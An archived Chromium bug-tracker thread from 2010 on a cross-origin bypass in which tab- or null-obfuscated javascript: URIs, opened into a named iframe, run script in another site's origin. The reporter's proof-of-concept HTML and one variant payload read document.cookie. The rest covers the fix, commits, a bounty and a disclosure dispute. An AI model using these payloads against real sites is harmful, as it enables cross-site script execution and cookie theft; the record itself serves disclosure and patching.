# Cross Origin Bypass using iframe & "	" on JAVASCRIPT URI 

| Field | Value |
|-------|-------|
| **Issue ID** | [40080219](https://issues.chromium.org/issues/40080219) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | jc...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2010-04-05 |
| **Bounty** | $1,000.00 |

## Description

similare to 37383

TESTCASE :
http://www.alternativ-testing.fr/googlechrossfd156d4f84dssd89v4ffd984/crossoriginbypass.html

code : 

<iframe name="test" src="http://www.google.fr"></iframe> 
<input type=button value="test" 
onclick="window.open('[%09]javascri[%09]pt:alert(document.cookie)','test')" >


## Timeline

### in...@chromium.org (2010-04-05)

able to reproduce successfully on v5 trunk. 

justin, if you dont mind, i can take this one up.

### in...@chromium.org (2010-04-05)

[Empty comment from Monorail migration]

### jc...@gmail.com (2010-04-05)

Sorry for the 2nd issue reported .

### in...@chromium.org (2010-04-05)

No worries Jconsultant. thank you very much for this bug.

ccing Adam and Justin to see what they think of this solution.

We need to canonicalize url using KURL at various places and NOT use it directly with
valueToStringWith*.
currently it is used like
String urlString = valueToStringWithUndefinedOrNullCheck(exec, args.at(0));
whereas is it should be
    KURL url(ParsedURLString, toWebCoreStringWithNullOrUndefinedCheck(args[0]));
    String urlString = url.string();
(this nullifies the exploit completely)

affected files (rough estimate, can be +/-)::
trunk/src/third_party/WebKit/WebCore/bindings/js/JSDOMWindowCustom.cpp 
trunk/src/third_party/WebKit/WebCore/bindings/js/JSWebSocketConstructor.cpp
trunk/src/third_party/WebKit/WebCore/bindings/v8/custom/V8DOMWindowCustom.cpp
trunk/src/third_party/WebKit/WebCore/platform/chromium/PasteboardChromium.cpp
trunk/src/third_party/WebKit/WebCore/bindings/js/JSHistoryCustom.cpp
trunk/src/third_party/WebKit/WebCore/bindings/js/JSElementCustom.cpp
trunk/src/third_party/WebKit/WebCore/bindings/js/JSHTMLIFrameElementCustom.cpp
trunk/src/third_party/WebKit/WebCore/bindings/js/JSHTMLFrameElementCustom.cpp

### jc...@gmail.com (2010-04-06)

I have also reported a website XSS using %09 unicode on javascript URI scheme  (Issue
http://code.google.com/p/chromium/issues/detail?id=39993). 

But this new issue is realy more critical.

SecSeverity-High ?

### in...@chromium.org (2010-04-06)

Yes Jconsultant, this issue is definitely critical and explains in detail how the
cross origin exploit can work. marking severity as high.

after analyzing, the tentative list boils down to the files listed below. i will fix
both the safari js bindings and chrome v8 bindings. 
M       bindings\js\JSElementCustom.cpp
M       bindings\js\JSHTMLFrameElementCustom.cpp
M       bindings\js\JSHistoryCustom.cpp
M       bindings\js\JSHTMLIFrameElementCustom.cpp
M       bindings\js\JSDOMWindowCustom.cpp
M       bindings\v8\custom\V8DOMWindowCustom.cpp

### in...@chromium.org (2010-04-06)

[Empty comment from Monorail migration]

### in...@chromium.org (2010-04-06)

reported upstream.

### jc...@gmail.com (2010-04-06)

I would like to thank you for your rapid answer :-) .

So , this bug is valid for proposed Chromium-Security-Reward?

### sc...@gmail.com (2010-04-06)

@jconsultant.chancel: I will ask the panel about a reward right away. Good bug, 
thanks.

### sc...@gmail.com (2010-04-06)

BTW, what would you like us to use as a credit for you? <Name> <of optional 
affiliation>.


### jc...@gmail.com (2010-04-06)

Name : Jordi Chancel

### jc...@gmail.com (2010-04-06)

[Comment Deleted]

### jc...@gmail.com (2010-04-06)

Correction, just my name will be enough.

### in...@chromium.org (2010-04-06)

forgot to include upstream bug url https://bugs.webkit.org/show_bug.cgi?id=37128



### in...@chromium.org (2010-04-06)

adding Dimitri to cc list so that he can review my cl for v8 bindings.

### jc...@gmail.com (2010-04-06)

\u0000javascri[%09]pt:alert(document.cookie) can bypass Cross-Origin as well .

### jc...@gmail.com (2010-04-06)

TESTCASE2 : 
http://www.alternativ-testing.fr/googlechrossfd156d4f84dssd89v4ffd984/crossoriginbypass-2.html

### in...@chromium.org (2010-04-06)

thanks Jordi, our fix should fix all these variants.

### in...@chromium.org (2010-04-07)

Adding Brett.

### [Deleted User] (2010-04-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-04-07)

@Jordi Chancel: thanks again for the report!
Subject to continuing responsible disclosure, the panel would like to reward you 
$1000! Congrats.
We normally fix security bugs very fast indeed. But there are substantial 
complications to fix this one, so please bear with us whilst we work through them.

### jc...@gmail.com (2010-04-07)

Thank you very much for this reward !


### jc...@gmail.com (2010-04-07)

BTW, when do you want my personal adress for the reward's sending?

### sc...@gmail.com (2010-04-07)

I'll generally reach out to you for needed details once we're about to release a patch 
with the fix.

### in...@chromium.org (2010-04-08)

Bug is reviewed in http://codereview.chromium.org/1558030 and patched in googleurl
library - http://code.google.com/p/google-url/source/detail?r=129.

Brett is helping to pull up this patched googleurl into our chrome code.

### bu...@gmail.com (2010-04-08)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=43991 

------------------------------------------------------------------------
r43991 | inferno@chromium.org | 2010-04-08 12:49:53 -0700 (Thu, 08 Apr 2010) | 6 lines
Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/249/src/DEPS?r1=43991&r2=43990

Pull r130 of googleurl.

BUG=40445
TEST=unit test on the googleurl side 

Review URL: http://codereview.chromium.org/1512027
------------------------------------------------------------------------


### bu...@gmail.com (2010-04-08)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=43996 

------------------------------------------------------------------------
r43996 | brettw@chromium.org | 2010-04-08 13:06:55 -0700 (Thu, 08 Apr 2010) | 5 lines
Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/DEPS?r1=43996&r2=43995

Pull r129 of googleurl, plus r130 which adds a newline for the Mac.

BUG=40445
TEST=unit test on the googleurl side
Review URL: http://codereview.chromium.org/1604018
------------------------------------------------------------------------


### br...@chromium.org (2010-04-08)

Should be fixed in r40445, this has not yet been pulled to any branches.

### in...@chromium.org (2010-04-08)

Lets keep this in FixUnreleased, until we release it in stable. 

### sc...@gmail.com (2010-04-08)

Yeah. It won't make the imminent patch, but should be OK to merge for the next one, 
Abhishek? (Once the branch is open again?)

### sc...@gmail.com (2010-04-08)

Ok looks like it will make the imminent patch.

### ma...@google.com (2010-04-13)

The GURL update did not work on the 249 branch, so this will not be fixed in the next 
249 update.

I'll consider branching GURL to get this fix in if it looks like Chrome 5 is going to 
slip much later.

### sc...@gmail.com (2010-04-13)

Aha, is this because pulling in the latest GURL involved 9 patches other than the 
security fix?

I think we should target another 4.1 patch, with this fix plus the fix Justin is 
working on for another related issue.

### jc...@gmail.com (2010-04-14)

Resolved for the next stable update ?

### in...@chromium.org (2010-04-23)

Jordi, an update for you. We are releasing the fix in the upcoming v4.1 patch. You
will be credited in the release notes. Thanks again for this great bug.

### jc...@gmail.com (2010-04-23)

Thank you for this information.
Have you an idea of the release's date?

### in...@chromium.org (2010-04-23)

unsure on the exact date, but sometime early next week.

### sc...@gmail.com (2010-05-19)

Was fixed in 4.1.249.1064

### sc...@gmail.com (2010-10-11)

A note for the official record. It turns out this bug was publicly disclosed prior to the fix being released: https://www.alternativ-testing.fr/blog/index.php?post/2010/Google-Chrome-Cross-Origin-Vulnerability

An early disclosure such as this would typically cancel any provisionally offered reward. Whilst disclosure, blogging, etc. of fixed bugs is encouraged, it is preferred if the fixes are available to users before any external disclosures.

### [Deleted User] (2010-10-12)

An asshole? Jordi give the money back.

### jc...@gmail.com (2010-10-12)

[Comment Deleted]

### js...@chromium.org (2010-10-12)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-29)

This issue was migrated from crbug.com/chromium/40445?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/40446]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40080219)*
